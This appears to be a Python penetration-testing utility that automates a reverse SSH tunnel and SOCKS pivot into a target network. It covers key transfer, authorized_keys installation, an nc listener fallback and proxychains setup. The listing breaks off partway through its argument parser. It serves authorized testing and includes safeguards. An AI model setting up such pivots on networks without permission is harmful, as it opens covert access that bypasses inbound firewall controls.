#!/usr/bin/env python3
"""
reverse_ssh_tunnel.py

Automate a reverse SSH tunnel with a SOCKS pivot mode, for authorized
penetration-testing engagements.

WHAT THIS DOES (a "reverse SOCKS pivot"):
  An internal machine you control dials OUT to a redirector you own, opening a
  SOCKS proxy on the redirector. Tools you point at that proxy are tunnelled
  back through the internal machine into the target network. This is useful when
  the internal machine can reach OUT to the internet but nothing can reach IN.

THREE SYSTEMS:
  * Operator host     - you; already has SSH to the redirector. Orchestrates.
  * Remote redirector - internet-facing; the SSH server + SOCKS proxy live here.
  * Internal sender   - inside the target network; outbound-only; the SSH client.

Runs on Windows or Linux for the internal (client) side; the redirector is Linux.

AUTHORIZED USE ONLY: for sanctioned engagements where you have written permission
to pivot through and connect to every system involved.
"""
from __future__ import annotations
import argparse
import base64
import hashlib
import hmac
import os
import re
import shlex
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
from pathlib import Path

DEFAULT_NAME = "reverse_tunnel"
DEFAULT_XFER_PORT = 4444
DEFAULT_SOCKS_PORT = 9050
SSH_DIR = Path.home() / ".ssh"

PUBKEY_PREFIXES = (
    "ssh-ed25519",
    "ssh-rsa",
    "ssh-dss",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ssh-ed25519@openssh.com",
    "sk-ecdsa-sha2-nistp256@openssh.com",
)

AUTH_NOTICE = (
    "AUTHORIZED USE ONLY: for sanctioned penetration-testing engagements. You are "
    "responsible for having written permission to pivot through and connect to "
    "every system involved."
)

TOP_EPILOG = """\
WHAT THIS DOES (a reverse SOCKS pivot):
  An internal machine you control dials OUT to a redirector you own, opening a
  SOCKS proxy on the redirector. Tools pointed at that proxy tunnel back through
  the internal machine into the target network. Handy when the internal machine
  can reach OUT but nothing can reach IN.

THREE SYSTEMS:
  * Operator host     - you; already has SSH to the redirector.
  * Remote redirector - internet-facing; SSH server + SOCKS proxy live here.
  * Internal sender   - inside the target network; outbound-only; SSH client.

TYPICAL ORDER (run each on the noted system):
  1. keygen       [internal]  make a keypair; the PRIVATE key never leaves it.
  2. recv-key     [remote]    listen for the public key.
  3. send-key     [internal]  send the public key; compare fingerprints.
  4. install-key  [remote]    add it to authorized_keys.
  5. tunnel       [internal]  open the reverse SSH connection + SOCKS proxy.
  6. verify       [internal]  confirm the forward from the client side.
  7. check        [remote]    prove traffic flows (curl -4 --socks5).
  Then set proxychains to 'socks5 127.0.0.1 9050' and run your tools.

  See it visually:   auxiliary reverse-ssh diagram
  Fallback (no repo on the redirector): every remote subcommand supports --print
  to emit the equivalent shell one-liner you can paste over your existing SSH.

""" + AUTH_NOTICE


def err(msg: str) -> None:
    """Print an error message to stderr."""
    print(f"error: {msg}", file=sys.stderr)


# --------------------------------------------------------------------------
# Pure helpers (unit-tested)
# --------------------------------------------------------------------------
def normalize_pubkey_text(text: str) -> str:
    """Normalize a public key to a single trailing '\\n' with no CR characters."""
    text = text.replace("\r\n", "\n").replace("\r", "\n")
    return text.strip() + "\n"


def normalize_pubkey_bytes(data: bytes) -> bytes:
    """CRLF-normalize public key bytes. A stray CRLF silently breaks authorized_keys."""
    return normalize_pubkey_text(data.decode("utf-8", errors="ignore")).encode("utf-8")


def looks_like_private_key(text: str) -> bool:
    """True if the text appears to be a private key (guards against sending secrets)."""
    return "PRIVATE KEY" in text


def is_valid_pubkey(text: str) -> bool:
    """True if text is exactly one well-formed SSH public key line."""
    lines = [ln for ln in text.replace("\r", "\n").split("\n") if ln.strip()]
    if len(lines) != 1:
        return False
    parts = lines[0].split()
    if len(parts) < 2:
        return False
    keytype, blob = parts[0], parts[1]
    if not any(keytype == p or keytype.startswith(p) for p in PUBKEY_PREFIXES):
        return False
    try:
        raw = base64.b64decode(blob, validate=True)
    except Exception:
        return False
    return len(raw) >= 4


def compute_mac(secret: str, data: bytes) -> str:
    """HMAC-SHA256 of data under a shared secret, hex-encoded."""
    return hmac.new(secret.encode("utf-8"), data, hashlib.sha256).hexdigest()


def verify_mac(secret: str, data: bytes, mac_hex: str) -> bool:
    """Constant-time verification of an HMAC-SHA256 tag."""
    return hmac.compare_digest(compute_mac(secret, data), mac_hex.strip())


def parse_ssh_version(text: str):
    """Extract (major, minor) from `ssh -V` output, or None if not found."""
    m = re.search(r"OpenSSH_(\d+)\.(\d+)", text)
    return (int(m.group(1)), int(m.group(2))) if m else None


def version_at_least(ver, major: int, minor: int) -> bool:
    """True if the parsed version tuple is >= (major, minor)."""
    return bool(ver) and ver >= (major, minor)


def choose_identity(identity, name, ssh_dir, exists):
    """Resolve the private key ssh should use, returning (abs_path_or_None, error_or_None).

    `exists` is a callable(path)->bool, injected so this is testable without touching the
    filesystem. The returned path is always absolute so ssh never resolves it against the
    current working directory.
    """
    if identity:
        p = Path(identity).expanduser()
        if exists(str(p)):
            return os.path.abspath(str(p)), None
        # A bare name (no path separator) also gets looked up in ~/.ssh, so `-i reverse_tunnel`
        # works from any directory instead of only the current one.
        bare = os.sep not in identity and not (os.altsep and os.altsep in identity)
        if bare:
            alt = ssh_dir / identity
            if exists(str(alt)):
                return os.path.abspath(str(alt)), None
        return None, ("identity key not found: %s (also checked %s)"
                      % (identity, ssh_dir / identity))
    default = ssh_dir / name
    if exists(str(default)):
        return os.path.abspath(str(default)), None
    return None, ("no identity key at %s -- run `keygen --name %s` first, or pass "
                  "-i /path/to/key (or --ssh-host ALIAS if you use ssh-agent/~/.ssh/config)."
                  % (default, name))


def build_tunnel_command(host=None, user=None, identity=None, ssh_host=None,
                         socks_port=DEFAULT_SOCKS_PORT, forward=None,
                         verbose=False, keepalive=True):
    """Build the ssh reverse-forward command as an argv list."""
    cmd = ["ssh"]
    if verbose:
        cmd.append("-v")
    if identity:
        cmd += ["-i", str(identity), "-o", "IdentitiesOnly=yes"]
    cmd.append("-N")
    cmd += ["-R", forward if forward else "127.0.0.1:%d" % socks_port]
    if keepalive:
        cmd += ["-o", "ServerAliveInterval=30", "-o", "ServerAliveCountMax=3"]
    if ssh_host:
        target = ssh_host
    elif user:
        target = "%s@%s" % (user, host)
    else:
        target = host
    cmd.append(target)
    return cmd


def build_config_entry(alias, host, user=None, identity=None,
                       socks_port=DEFAULT_SOCKS_PORT, forward=None):
    """Build a ready-to-paste ~/.ssh/config block for the tunnel."""
    rf = forward if forward else "127.0.0.1:%d" % socks_port
    lines = ["Host %s" % alias, "    HostName %s" % host]
    if user:
        lines.append("    User %s" % user)
    if identity:
        lines.append("    IdentityFile %s" % identity)
        lines.append("    IdentitiesOnly yes")
    lines.append("    RemoteForward %s" % rf)
    lines.append("    ServerAliveInterval 30")
    lines.append("    ServerAliveCountMax 3")
    return "\n".join(lines) + "\n"


def build_diagram(sequence: bool = False, socks_port=DEFAULT_SOCKS_PORT) -> str:
    """Return Mermaid diagram syntax for the pivot topology or setup sequence."""
    if sequence:
        return "\n".join([
            "sequenceDiagram",
            "    participant INT as Internal sender",
            "    participant RM as Remote redirector",
            "    participant OP as Operator host",
            "    INT->>INT: keygen (private key stays here)",
            "    RM->>RM: recv-key (listen)",
            "    INT->>RM: send-key (public key; HMAC/TLS optional)",
            "    Note over INT,RM: compare fingerprints",
            "    RM->>RM: install-key (authorized_keys)",
            "    INT->>RM: tunnel  ssh -N -R 127.0.0.1:%d" % socks_port,
            "    INT->>INT: verify",
            "    RM->>RM: check  curl -4 --socks5",
            "    OP->>RM: proxychains via SOCKS 127.0.0.1:%d" % socks_port,
            "    RM-->>INT: traffic tunnelled into target network",
        ]) + "\n"
    return "\n".join([
        "flowchart LR",
        "    subgraph OP[Operator host]",
        "        A[you: proxychains / ssh -L]",
        "    end",
        "    subgraph RM[Remote redirector - internet-facing]",
        "        S[sshd]",
        "        P[SOCKS proxy 127.0.0.1:%d]" % socks_port,
        "    end",
        "    subgraph INT[Internal sender - target network]",
        "        C[ssh client -N -R]",
        "    end",
        "    subgraph TGT[Internal targets]",
        "        T[hosts / services]",
        "    end",
        "    A -- existing SSH --> S",
        "    C == outbound reverse SSH ==> S",
        "    S -. opens .-> P",
        "    A -- via SOCKS --> P",
        "    P == tunnelled back over reverse SSH ==> C",
        "    C --> T",
    ]) + "\n"


# --------------------------------------------------------------------------
# Impure helpers
# --------------------------------------------------------------------------
def get_fingerprint(pubkey_text: str):
    """Return the `ssh-keygen -lf` fingerprint line for a public key, or None."""
    kg = shutil.which("ssh-keygen")
    if not kg:
        return None
    tmp = None
    try:
        with tempfile.NamedTemporaryFile("w", suffix=".pub", delete=False,
                                         encoding="utf-8") as f:
            f.write(pubkey_text if pubkey_text.endswith("\n") else pubkey_text + "\n")
            tmp = f.name
        out = subprocess.run([kg, "-lf", tmp], capture_output=True, text=True)
        return out.stdout.strip() if out.returncode == 0 else None
    except Exception:
        return None
    finally:
        if tmp:
            try:
                os.unlink(tmp)
            except OSError:
                pass


def _make_tls_cert():
    """Create an ephemeral self-signed cert via openssl. Returns (cert, key, sha256)."""
    openssl = shutil.which("openssl")
    if not openssl:
        return None, None, None
    cfd, certfile = tempfile.mkstemp(suffix=".pem")
    kfd, keyfile = tempfile.mkstemp(suffix=".pem")
    os.close(cfd)
    os.close(kfd)
    cmd = [openssl, "req", "-x509", "-newkey", "rsa:2048", "-nodes",
           "-keyout", keyfile, "-out", certfile, "-days", "1", "-subj", "/CN=pivot"]
    r = subprocess.run(cmd, capture_output=True)
    if r.returncode != 0:
        for p in (certfile, keyfile):
            try:
                os.unlink(p)
            except OSError:
                pass
        return None, None, None
    try:
        der = ssl.PEM_cert_to_DER_cert(Path(certfile).read_text())
        fp = hashlib.sha256(der).hexdigest()
    except Exception:
        fp = None
    return certfile, keyfile, fp


def _port_listening(port: int, host: str = "127.0.0.1") -> bool:
    """True if a TCP connection to host:port succeeds."""
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def _warn_ssh_version(ssh: str) -> None:
    """Warn if the local OpenSSH client is older than 7.6 (dynamic -R needs 7.6+)."""
    try:
        r = subprocess.run([ssh, "-V"], capture_output=True, text=True)
    except Exception:
        return
    ver = parse_ssh_version((r.stderr or "") + (r.stdout or ""))
    if ver and not version_at_least(ver, 7, 6):
        print("WARNING: OpenSSH %d.%d detected; remote dynamic forwarding needs 7.6+."
              % ver, file=sys.stderr)


def _print_proxychains_warning(port: int) -> None:
    """Print the proxychains configuration warning."""
    bar = "=" * 70
    print(bar)
    print("WARNING: proxychains must point at this SOCKS proxy or it fails silently.")
    print("  In /etc/proxychains.conf (or proxychains4.conf), under [ProxyList]:")
    print("      socks5 127.0.0.1 %d" % port)
    print("  Use lowercase 'socks5' (NOT socks4) and this exact port.")
    print(bar)


# --------------------------------------------------------------------------
# Subcommands
# --------------------------------------------------------------------------
def cmd_keygen(args) -> int:
    """[internal] Generate an ed25519 keypair; the private key never leaves this host."""
    kg = shutil.which("ssh-keygen")
    if not kg:
        err("ssh-keygen not found. On Windows enable the 'OpenSSH Client' feature.")
        return 2
    SSH_DIR.mkdir(parents=True, exist_ok=True)
    try:
        os.chmod(SSH_DIR, 0o700)
    except OSError:
        pass
    priv = SSH_DIR / args.name
    pub = SSH_DIR / (args.name + ".pub")
    if priv.exists() and not args.force:
        err("%s already exists; use --force to overwrite." % priv)
        return 1
    if args.force:
        for p in (priv, pub):
            try:
                p.unlink()
            except FileNotFoundError:
                pass
    cmd = [kg, "-t", "ed25519", "-f", str(priv)]
    if args.comment:
        cmd += ["-C", args.comment]
    if args.passphrase is not None:
        cmd += ["-N", args.passphrase]
        if args.passphrase == "":
            print("WARNING: blank passphrase -- the private key is a standalone "
                  "credential. Protect this host accordingly.")
    else:
        print("[keygen] ssh-keygen will prompt for a passphrase "
              "(recommended; leave empty only if you accept the risk).")
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        return rc
    print("[keygen] private key: %s  (keep it here; never transmit it)" % priv)
    print("[keygen] public key:  %s" % pub)
    fp = get_fingerprint(pub.read_text(encoding="utf-8", errors="ignore"))
    if fp:
        print("[keygen] fingerprint: %s" % fp)
    print("Next: on the REMOTE redirector run `recv-key`, then here run `send-key`.")
    return 0


def cmd_send_key(args) -> int:
    """[internal] Send the public key to the remote's recv-key listener (pure-Python)."""
    keypath = Path(args.key) if args.key else (SSH_DIR / (args.name + ".pub"))
    if not keypath.exists():
        err("public key not found: %s" % keypath)
        return 1
    raw = keypath.read_bytes()
    text = raw.decode("utf-8", errors="ignore")
    if looks_like_private_key(text):
        err("refusing to send: %s looks like a PRIVATE key. Send the .pub only." % keypath)
        return 1
    if not is_valid_pubkey(text):
        err("%s is not a valid single-line public key." % keypath)
        return 1
    payload = normalize_pubkey_bytes(raw)
    fp = get_fingerprint(payload.decode("utf-8"))
    if fp:
        print("[send-key] local fingerprint: %s" % fp)
        print("[send-key] compare this with what recv-key prints before install-key.")
    wire = payload
    if args.secret:
        wire = compute_mac(args.secret, payload).encode("ascii") + b"\n" + payload
    try:
        sock = socket.create_connection((args.host, args.port), timeout=args.timeout)
    except OSError as e:
        err("connect to %s:%d failed: %s" % (args.host, args.port, e))
        return 1
    try:
        if args.tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=args.host)
            der = sock.getpeercert(binary_form=True)
            if der:
                peer_fp = hashlib.sha256(der).hexdigest()
                print("[send-key] server cert SHA256: %s" % peer_fp)
                if args.tls_fingerprint:
                    want = args.tls_fingerprint.lower().replace(":", "")
                    if want != peer_fp:
                        err("TLS cert fingerprint mismatch -- aborting.")
                        return 1
        sock.sendall(wire)
        if args.tls:
            # A bare TCP half-close on a TLS socket is an unexpected EOF for the peer;
            # unwrap() sends close_notify so the listener sees a clean end of stream.
            try:
                sock = sock.unwrap()
            except (ssl.SSLError, OSError):
                pass
        try:
            sock.shutdown(socket.SHUT_WR)  # send EOF so the listener flushes and exits
        except OSError:
            pass
    except OSError as e:
        err("send failed: %s" % e)
        return 1
    finally:
        try:
            sock.close()
        except OSError:
            pass
    print("[send-key] sent public key (%d bytes on the wire) to %s:%d"
          % (len(wire), args.host, args.port))
    print("Next: on the REMOTE, confirm the fingerprint matches, then run `install-key`.")
    return 0


def cmd_recv_key(args) -> int:
    """[remote] Listen for the public key (pure-Python; no nc needed)."""
    if args.print:
        print("# Fallback (no repo on the redirector): run this instead of recv-key")
        print("nc -lvnp %d > /tmp/%s.pub" % (args.port, args.name))
        return 0
    out = Path(args.output) if args.output else Path("/tmp/%s.pub" % args.name)
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((args.bind, args.port))
    except OSError as e:
        err("bind %s:%d failed: %s" % (args.bind, args.port, e))
        return 1
    srv.listen(1)
    srv.settimeout(args.timeout)
    print("[recv-key] listening on %s:%d (one connection)" % (args.bind, args.port))
    print("[recv-key] REMINDER: firewall this port to the internal sender's egress IP; "
          "it is unauthenticated unless --secret/--tls is used.")
    certfile = keyfile = None
    tls_ctx = None
    if args.tls:
        certfile, keyfile, cert_fp = _make_tls_cert()
        if not certfile:
            err("could not create a TLS cert (is openssl installed?).")
            srv.close()
            return 2
        print("[recv-key] TLS cert SHA256: %s" % cert_fp)
        print("[recv-key] pin it on the sender with: send-key --tls-fingerprint %s" % cert_fp)
        tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        tls_ctx.load_cert_chain(certfile, keyfile)
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        err("timed out waiting for a connection.")
        srv.close()
        return 1
    data = b""
    try:
        if tls_ctx:
            conn = tls_ctx.wrap_socket(conn, server_side=True)
        conn.settimeout(args.timeout)
        chunks = []
        while True:
            b = conn.recv(65536)
            if not b:
                break
            chunks.append(b)
        data = b"".join(chunks)
    except OSError as e:
        err("receive failed: %s" % e)
        return 1
    finally:
        try:
            conn.close()
        except OSError:
            pass
        srv.close()
        for p in (certfile, keyfile):
            if p:
                try:
                    os.unlink(p)
                except OSError:
                    pass
    print("[recv-key] received %d bytes from %s" % (len(data), addr[0]))
    if args.secret:
        mac, sep, payload = data.partition(b"\n")
        if not sep:
            err("expected HMAC framing (--secret) but none was present.")
            return 1
        if not verify_mac(args.secret, payload, mac.decode("ascii", errors="ignore")):
            err("HMAC verification FAILED -- possible tampering. Discarding.")
            return 1
        print("[recv-key] HMAC verified OK")
    else:
        payload = data
    text = payload.decode("utf-8", errors="ignore")
    if looks_like_private_key(text):
        err("received data looks like a PRIVATE key -- discarding.")
        return 1
    if not is_valid_pubkey(text):
        err("received data is not a valid single-line public key -- discarding.")
        return 1
    norm = normalize_pubkey_bytes(payload)
    out.write_bytes(norm)
    print("[recv-key] wrote %s" % out)
    fp = get_fingerprint(norm.decode("utf-8"))
    if fp:
        print("[recv-key] fingerprint: %s" % fp)
        print("[recv-key] this MUST match what send-key printed.")
    print("Next: run `install-key --from %s` on this remote system." % out)
    return 0


def _resolve_pubkey_text(args):
    """Resolve the public key text for install-key from --pubkey/--from/stdin/default."""
    if args.pubkey:
        return args.pubkey
    if args.from_file:
        p = Path(args.from_file)
        if not p.exists():
            err("file not found: %s" % p)
            return None
        return p.read_text(encoding="utf-8", errors="ignore")
    if not sys.stdin.isatty():
        return sys.stdin.read()
    default = Path("/tmp/%s.pub" % args.name)
    if default.exists():
        return default.read_text(encoding="utf-8", errors="ignore")
    err("no key given: use --from FILE, --pubkey 'KEY', or pipe it on stdin.")
    return None


def _print_install_commands(norm: str) -> None:
    """Print the shell one-liner to install a key (paste fallback)."""
    key = norm.strip()
    print("# Paste on the REMOTE redirector:")
    print("mkdir -p ~/.ssh && chmod 700 ~/.ssh")
    print("printf '%%s\\n' \"%s\" >> ~/.ssh/authorized_keys" % key)
    print("chmod 600 ~/.ssh/authorized_keys")
    print("# If CRLF is suspected: sudo apt-get install -y dos2unix && "
          "dos2unix ~/.ssh/authorized_keys")


def cmd_install_key(args) -> int:
    """[remote] Install the received public key into authorized_keys."""
    text = _resolve_pubkey_text(args)
    if text is None:
        return 1
    if looks_like_private_key(text):
        err("refusing: that looks like a PRIVATE key.")
        return 1
    if not is_valid_pubkey(text):
        err("not a valid single-line public key.")
        return 1
    norm = normalize_pubkey_text(text)
    fp = get_fingerprint(norm)
    if fp:
        print("[install-key] fingerprint: %s  (confirm it matches the sender)" % fp)
    if args.print:
        _print_install_commands(norm)
        return 0
    if args.via_ssh:
        ssh = shutil.which("ssh")
        if not ssh:
            err("ssh not found.")
            return 2
        remote_cmd = ("mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
                      "cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys")
        print("[install-key] installing on %s over existing SSH..." % args.via_ssh)
        proc = subprocess.run([ssh, args.via_ssh, remote_cmd], input=norm, text=True)
        return proc.returncode
    ak_dir = Path.home() / ".ssh"
    ak = ak_dir / "authorized_keys"
    ak_dir.mkdir(parents=True, exist_ok=True)
    try:
        os.chmod(ak_dir, 0o700)
    except OSError:
        pass
    existing = ak.read_text(encoding="utf-8", errors="ignore") if ak.exists() else ""
    if norm.strip() in existing:
        print("[install-key] key already present in authorized_keys -- nothing to do.")
    else:
        with ak.open("a", encoding="utf-8") as f:
            if existing and not existing.endswith("\n"):
                f.write("\n")
            f.write(norm)
        print("[install-key] appended key to %s" % ak)
    try:
        os.chmod(ak, 0o600)
    except OSError:
        pass
    print("Next: on the INTERNAL sender run `tunnel`.")
    return 0


def cmd_tunnel(args) -> int:
    """[internal] Open the reverse SSH connection (SOCKS pivot or single forward)."""
    ssh = shutil.which("ssh")
    if not ssh:
        err("ssh not found. On Windows enable the 'OpenSSH Client' optional feature.")
        return 2
    if not args.ssh_host and not args.host:
        err("--host (or --ssh-host ALIAS) is required.")
        return 1
    if args.config_entry:
        # The block may be generated before keygen runs, so emit the intended path
        # (no existence check / no error here).
        if args.ssh_host:
            identity = None
        elif args.identity:
            identity = str(Path(args.identity).expanduser())
        else:
            identity = str(SSH_DIR / args.name)
        alias = args.ssh_host or args.host
        print(build_config_entry(alias, args.host or alias, args.user, identity,
                                 args.socks_port, args.forward), end="")
        return 0
    if args.ssh_host:
        identity = None
    else:
        identity, ierr = choose_identity(args.identity, args.name, SSH_DIR, os.path.exists)
        if ierr:
            err(ierr)
            return 1
    _warn_ssh_version(ssh)
    cmd = build_tunnel_command(host=args.host, user=args.user, identity=identity,
                               ssh_host=args.ssh_host, socks_port=args.socks_port,
                               forward=args.forward)
    if args.print_only:
        print(" ".join(shlex.quote(c) for c in cmd))
        if not args.forward:
            _print_proxychains_warning(args.socks_port)
        return 0
    print("[tunnel] running: %s" % " ".join(cmd))
    if not args.forward:
        _print_proxychains_warning(args.socks_port)
        reach = args.host or args.ssh_host
        userat = ("%s@" % args.user) if args.user else ""
        print("[tunnel] reach the SOCKS proxy from the operator host with:")
        print("    ssh -L %d:127.0.0.1:%d %s%s"
              % (args.socks_port, args.socks_port, userat, reach))
    print("[tunnel] press Ctrl-C to tear down.")
    try:
        return subprocess.run(cmd).returncode
    except KeyboardInterrupt:
        print("\n[tunnel] closed.")
        return 0


def cmd_verify(args) -> int:
    """[internal] Confirm the reverse forward from the client side (best-effort)."""
    ssh = shutil.which("ssh")
    if not ssh:
        err("ssh not found.")
        return 2
    if not args.ssh_host and not args.host:
        err("--host (or --ssh-host ALIAS) is required.")
        return 1
    if args.ssh_host:
        identity = None
    else:
        identity, ierr = choose_identity(args.identity, args.name, SSH_DIR, os.path.exists)
        if ierr:
            err(ierr)
            return 1
    target = args.ssh_host or (("%s@%s" % (args.user, args.host)) if args.user else args.host)
    # Use a throwaway remote port so verify does not collide with a live SOCKS tunnel
    # already holding --socks-port on the remote.
    test_port = args.test_port if args.test_port else args.socks_port + 10000
    rf = args.forward if args.forward else "127.0.0.1:%d" % test_port
    cmd = [ssh, "-v", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=15",
           "-o", "ServerAliveInterval=30", "-o", "ServerAliveCountMax=3"]
    if identity:
        cmd += ["-i", identity, "-o", "IdentitiesOnly=yes"]
    cmd += ["-R", rf, target, "echo __PIVOT_OK__"]
    if args.print_only:
        print(" ".join(shlex.quote(c) for c in cmd))
        return 0
    print("[verify] establishing a short-lived test forward...")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout)
    except subprocess.TimeoutExpired:
        err("verify timed out.")
        return 1
    combined = ((r.stdout or "") + "\n" + (r.stderr or "")).lower()
    ok = "__pivot_ok__" in (r.stdout or "").lower()
    established = ("remote forward success" in combined
                  or "all remote forwarding requests processed" in combined)
    failed = "remote port forwarding failed" in combined
    if failed and not ok:
        print("[verify] RESULT: FAIL -- remote port forwarding was refused.")
        print("         Ensure the port is free on the remote and AllowTcpForwarding=yes.")
        return 1
    if ok or established:
        print("[verify] RESULT: PASS -- reverse forward established.")
        if not args.forward:
            print("[verify] (tested on throwaway port %d; safe to run whether or not the "
                  "live tunnel is up.)" % test_port)
            _print_proxychains_warning(args.socks_port)
        return 0
    print("[verify] RESULT: UNKNOWN -- could not confirm. Last ssh -v lines:")
    print("\n".join(((r.stderr or "").strip().splitlines() or ["(no output)"])[-12:]))
    return 1


def cmd_check(args) -> int:
    """[remote] Prove the SOCKS listener is up and traffic flows through the pivot."""
    port = args.socks_port
    if args.print:
        print("ss -tlnp | grep %d   # owner shows as sshd, not your shell" % port)
        flag = "--socks5-hostname" if args.socks5_hostname else "--socks5"
        print("curl -4 %s 127.0.0.1:%d %s" % (flag, port, args.url))
        print("# -4 is required: SOCKS+IPv6 dies with 'proxy closed connection' on "
              "v4-only pivots.")
        print("# --socks5-hostname resolves DNS at the far (internal) end.")
        return 0
    bound = _port_listening(port)
    print("[check] SOCKS 127.0.0.1:%d listening: %s" % (port, "YES" if bound else "NO"))
    if not bound:
        print("[check] tunnel is not up here yet (run `tunnel` on the internal sender).")
    curl = shutil.which("curl")
    if curl:
        flag = "--socks5-hostname" if args.socks5_hostname else "--socks5"
        c = [curl, "-4", "-s", "--max-time", "20", flag, "127.0.0.1:%d" % port, args.url]
        print("[check] running: %s" % " ".join(c))
        r = subprocess.run(c, capture_output=True, text=True)
        if r.returncode == 0 and r.stdout.strip():
            print("[check] RESULT: PASS -- egress IP via the pivot: %s" % r.stdout.strip())
        else:
            print("[check] RESULT: FAIL -- %s" % (r.stderr.strip() or "curl error"))
            print("        Remember -4 is required; SOCKS+IPv6 fails on v4-only pivots.")
    else:
        print("[check] curl not found; use --print for manual commands.")
    _print_proxychains_warning(port)
    return 0


def cmd_preflight(args) -> int:
    """[remote] Report sshd settings relevant to the pivot (does not change anything)."""
    print("[preflight] Remote redirector sshd checklist (nothing is changed):")
    cfg = Path(args.sshd_config)
    if cfg.exists() and not args.print:
        txt = cfg.read_text(encoding="utf-8", errors="ignore")
        for key in ("AllowTcpForwarding", "GatewayPorts", "PermitRootLogin"):
            m = re.search(r"(?im)^\s*%s\s+(\S+)" % key, txt)
            print("  current %-20s = %s" % (key, m.group(1) if m else "(default)"))
    print("  - AllowTcpForwarding yes   (needed for the SOCKS reverse forward; default yes)")
    print("  - PermitRootLogin prohibit-password|yes   (only if you connect as root)")
    print("  - GatewayPorts: LEAVE DEFAULT (no). Do NOT set 'yes' -- it would expose the")
    print("      SOCKS proxy on the internet-facing redirector. Keep SOCKS on loopback and")
    print("      reach it via proxychains-on-remote or `ssh -L`.")
    return 0


def cmd_diagram(args) -> int:
    """[any] Print Mermaid diagram syntax for the pivot (paste into mermaid.live)."""
    print("```mermaid")
    print(build_diagram(sequence=args.sequence, socks_port=args.socks_port), end="")
    print("```")
    return 0


# --------------------------------------------------------------------------
# Argument parsing
# --------------------------------------------------------------------------
def _add_target_flags(sp):
    """Add ssh target flags shared by tunnel and verify."""
    sp.add_argument("--host", help="Remote redirector hostname or IP")
    sp.add_argument("--user", help="SSH username on the remote redirector")
    sp.add_argument("-i", "--identity", help="Private key path "
                    "(default: ~/.ssh/<name> if it exists)")
    sp.add_argument("--ssh-host", help="Use a ~/.ssh/config Host alias instead of "
                    "--host/--user/-i")
    sp.add_argument("--socks-port", type=int, default=DEFAULT_SOCKS_PORT,
                    help="SOCKS port on the remote loopback (default: %d)" % DEFAULT_SOCKS_PORT)
    sp.add_argument("--name", default=DEFAULT_NAME,
                    help="Key basename for the default identity (default: %s)" % DEFAULT_NAME)


def build_parser():
    """Build the argparse parser with all subcommands."""
    p = argparse.ArgumentParser(
        prog="reverse-ssh",
        description="Set up, establish, and test a reverse SSH tunnel with a SOCKS "
                    "pivot mode across three systems.",
        epilog=TOP_EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = p.add_subparsers(dest="command", metavar="<subcommand>")

    sp = sub.add_parser("keygen", help="[internal] make an ed25519 keypair",
                        description="[internal sender] Generate an ed25519 keypair. The "
                        "private key stays on this host and is never transmitted.")
    sp.add_argument("--name", default=DEFAULT_NAME,
                    help="Key basename (default: %s)" % DEFAULT_NAME)
    sp.add_argument("--comment", help="Key comment (-C)")
    sp.add_argument("--passphrase", default=None,
                    help="Passphrase (WARNING: visible in process list/history; omit to "
                         "be prompted interactively; '' means blank = standalone credential)")
    sp.add_argument("--force", action="store_true", help="Overwrite an existing key")
    sp.set_defaults(func=cmd_keygen)

    sp = sub.add_parser("send-key", help="[internal] send the public key to the remote",
                        description="[internal sender] Stream the PUBLIC key to the "
                        "remote's recv-key listener over a pure-Python TCP socket.")
    sp.add_argument("--host", required=True, help="Remote redirector host/IP")
    sp.add_argument("--port", type=int, default=DEFAULT_XFER_PORT,
                    help="Listener port (default: %d)" % DEFAULT_XFER_PORT)
    sp.add_argument("--key", help="Path to the .pub (default: ~/.ssh/<name>.pub)")
    sp.add_argument("--name", default=DEFAULT_NAME,
                    help="Key basename for the default .pub (default: %s)" % DEFAULT_NAME)
    sp.add_argument("--secret", help="Shared secret to HMAC-authenticate the transfer")
    sp.add_argument("--tls", action="store_true", help="Encrypt the transfer with TLS")
    sp.add_argument("--tls-fingerprint", help="Pin the listener's cert SHA256 (with --tls)")
    sp.add_argument("--timeout", type=float, default=30.0, help="Socket timeout seconds")
    sp.set_defaults(func=cmd_send_key)

    sp = sub.add_parser("recv-key", help="[remote] listen for the public key",
                        description="[remote redirector] Listen for the public key over a "
                        "pure-Python TCP socket (no nc needed). Use --print for the nc "
                        "fallback.")
    sp.add_argument("--port", type=int, default=DEFAULT_XFER_PORT,
                    help="Listener port (default: %d)" % DEFAULT_XFER_PORT)
    sp.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    sp.add_argument("--output", help="Where to write the key (default: /tmp/<name>.pub)")
    sp.add_argument("--name", default=DEFAULT_NAME,
                    help="Key basename for the default output (default: %s)" % DEFAULT_NAME)
    sp.add_argument("--secret", help="Shared secret to verify the HMAC (reject on mismatch)")
    sp.add_argument("--tls", action="store_true", help="Serve TLS (needs openssl for a cert)")
    sp.add_argument("--timeout", type=float, default=300.0,
                    help="Seconds to wait for a connection (default: 300)")
    sp.add_argument("--print", action="store_true", help="Print the nc fallback and exit")
    sp.set_defaults(func=cmd_recv_key)

    sp = sub.add_parser("install-key", help="[remote] add the key to authorized_keys",
                        description="[remote redirector] Validate and append the public key "
                        "to ~/.ssh/authorized_keys. Accepts --from FILE, --pubkey 'KEY', or "
                        "stdin (the paste fallback).")
    sp.add_argument("--from", dest="from_file", help="Path to the received .pub")
    sp.add_argument("--pubkey", help="The public key as a single-line string")
    sp.add_argument("--name", default=DEFAULT_NAME,
                    help="Key basename for the default /tmp/<name>.pub (default: %s)"
                    % DEFAULT_NAME)
